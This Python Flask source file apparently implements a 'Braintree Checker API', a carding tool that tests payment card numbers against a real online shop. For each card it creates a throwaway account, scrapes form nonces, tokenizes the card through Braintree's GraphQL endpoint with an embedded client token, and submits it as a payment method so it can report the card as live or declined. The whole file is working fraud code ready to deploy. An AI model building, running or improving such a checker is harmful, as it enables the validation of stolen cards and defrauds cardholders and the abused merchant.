from flask import Flask, jsonify
import requests
import re
import json
import random
import string
from bs4 import BeautifulSoup

# --- Configuration ---
VALID_API_KEY = "diwazz"
BRAINTREE_CLIENT_TOKEN = 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3NjE4NTA3MzUsImp0aSI6IjRjZjQwYTU0LTJjMjUtNDIwZC1hYzcyLWRhYzM1MzE5MmQ5NiIsInN1YiI6Ijg1Zmh2amhocTZqMnhoazgiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6Ijg1Zmh2amhocTZqMnhoazgiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlLCJ2ZXJpZnlfd2FsbGV0X2J5X2RlZmF1bHQiOmZhbHNlfSwicmlnaHRzIjpbIm1hbmFnZV92YXVsdCJdLCJzY29wZSI6WyJCcmFpbnRyZWU6VmF1bHQiLCJCcmFpbnRyZWU6Q2xpZW50U0RLIl0sIm9wdGlvbnMiOnt9fQ.AqIvVz1rquy1ZSvRXpCOM8mRCR1d9a7AuTdCUmIcy5TCn5O5qvoejohYrxqMVud0kuPaxCnKhWaMg5gO4UBCuw'

# --- Flask App Initialization ---
app = Flask(__name__)

# --- Helper Functions ---
def get_bin_details(bin_number):
    """BIN number se details fetch karta hai."""
    try:
        card_bin = bin_number[:8]
        headers = {'Accept-Version': '3'}
        # Timeout add kiya gaya hai taaki API hang na ho
        response = requests.get(f"https://lookup.binlist.net/{card_bin}", headers=headers, timeout=5)
        if response.status_code == 200:
            data = response.json()
            return {
                "scheme": data.get("scheme", "N/A"), "type": data.get("type", "N/A"),
                "brand": data.get("brand", "N/A"), "country": data.get("country", {}).get("name", "N/A"),
                "bank": data.get("bank", {}).get("name", "N/A"),
            }
        return {"error": f"BIN not found (Status: {response.status_code})"}
    except requests.exceptions.RequestException as e:
        return {"error": f"Failed to fetch BIN details: {e}"}

def generate_random_string(length=10):
    """Ek random string generate karta hai."""
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))

# --- Main Checker Logic (Fully Automated) ---
def run_braintree_check(card_details):
    bin_info = {}
    # Session object har function call ke andar banaya ja raha hai
    session = requests.Session()
    session.headers.update({
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36'
    })

    try:
        cc, mm, yy, cvv = card_details.split('|')
        bin_info = get_bin_details(cc)

        # === Part 1: Register New Account on Altairtech ===
        # Har baar ek naya session banega
        register_url = 'https://altairtech.io/account/lost-password/#login'
        reg_page_res = session.get(register_url, timeout=10)
        soup = BeautifulSoup(reg_page_res.text, 'html.parser')
        
        # Register nonce ko dhoondhna
        reg_nonce_tag = soup.find('input', {'name': 'woocommerce-register-nonce'})
        if not reg_nonce_tag:
            raise Exception("Altairtech registration form nonce not found.")
        reg_nonce = reg_nonce_tag.get('value')
        
        email = f"{generate_random_string()}@gmail.com"
        
        register_payload = {
            'email': email,
            'woocommerce-register-nonce': reg_nonce,
            '_wp_http_referer': '/account/lost-password/',
            'register': 'Register',
        }
        
        register_res = session.post(register_url, data=register_payload)
        if "My account" not in register_res.text and "Log out" not in register_res.text:
            raise Exception("Altairtech registration failed. Site might be blocking.")

        # === Part 2: Get Dynamic Nonces from Payment Page ===
        payment_page_url = 'https://altairtech.io/account/add-payment-method/'
        payment_page_res = session.get(payment_page_url, timeout=10)
        soup = BeautifulSoup(payment_page_res.text, 'html.parser')
        
        woocommerce_nonce_tag = soup.find('input', {'name': 'woocommerce-add-payment-method-nonce'})
        if not woocommerce_nonce_tag:
            raise Exception("Could not find 'woocommerce-add-payment-method-nonce'.")
        woocommerce_nonce = woocommerce_nonce_tag.get('value')

        # === Part 3: Generate Braintree Nonce ===
        graphql_headers = {'accept': '*/*', 'authorization': BRAINTREE_CLIENT_TOKEN, 'braintree-version': '2018-05-10', 'content-type': 'application/json', 'origin': 'https://assets.braintreegateway.com'}
        graphql_payload = {'clientSdkMetadata': {'source': 'client', 'integration': 'custom', 'sessionId': 'c620b769-a8f3-4fde-9604-cc98c4e959f7'}, 'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token } }', 'variables': {'input': {'creditCard': {'number': cc, 'expirationMonth': mm, 'expirationYear': yy, 'cvv': cvv}, 'options': {'validate': False}}}, 'operationName': 'TokenizeCreditCard'}
        
        response_graphql = requests.post('https://payments.braintree-api.com/graphql', headers=graphql_headers, json=graphql_payload, timeout=10)
        response_graphql.raise_for_status()
        braintree_data = response_graphql.json()
        
        if 'errors' in braintree_data:
            return {"status": "error", "message": braintree_data['errors'][0]['message'], "bin_details": bin_info, "response": "Declined"}
        
        payment_nonce = braintree_data['data']['tokenizeCreditCard']['token']

        # === Part 4: Submit to Altairtech with Fresh Session ===
        altair_data = {'payment_method': 'braintree_credit_card', 'wc_braintree_credit_card_payment_nonce': payment_nonce, 'wc_braintree_device_data': '{"correlation_id":"ce230cbd851503d4f63f8a47ebc9eb46"}', 'woocommerce-add-payment-method-nonce': woocommerce_nonce, '_wp_http_referer': '/account/add-payment-method/', 'woocommerce_add_payment_method': '1'}
        
        # Session object cookies ko automatically handle kar raha hai
        response_altair = session.post(payment_page_url, data=altair_data, timeout=10)
        
        match = re.search(r'Status code\s*([^<]+)\s*</li>', response_altair.text)
        if match:
            status_message = match.group(1).strip()
            if "fraud" in status_message.lower() or "declined" in status_message.lower():
                return {"status": "live_declined", "message": status_message, "bin_details": bin_info, "response": "Declined"}
            else:
                 return {"status": "live_approved", "message": status_message, "bin_details": bin_info, "response": "Approved"}
        else:
            return {"status": "error", "message": "Could not parse final response from Altairtech.", "bin_details": bin_info, "response": "Error"}

    except Exception as e:
        return {"status": "error", "message": str(e), "bin_details": bin_info, "response": "Error"}


# --- API Route ---
@app.route('/gate/b3/key=<api_key>/<card_details>')
def process_payment(api_key, card_details):
    if api_key != VALID_API_KEY:
        return jsonify({"status": "error", "message": "Invalid API Key"}), 401
    if card_details.count('|') != 3:
        return jsonify({"status": "error", "message": "Invalid card format. Use cc|mm|yy|cvv"}), 400
    
    result = run_braintree_check(card_details)
    return jsonify(result)

# --- Health Check Route ---
@app.route('/')
def index():
    return "Braintree Checker API (Fully Automated) is running!"

if __name__ == '__main__':
    # Yeh local testing ke liye hai. Render Gunicorn ka istemaal karega.
    app.run(host='0.0.0.0', port=5000)
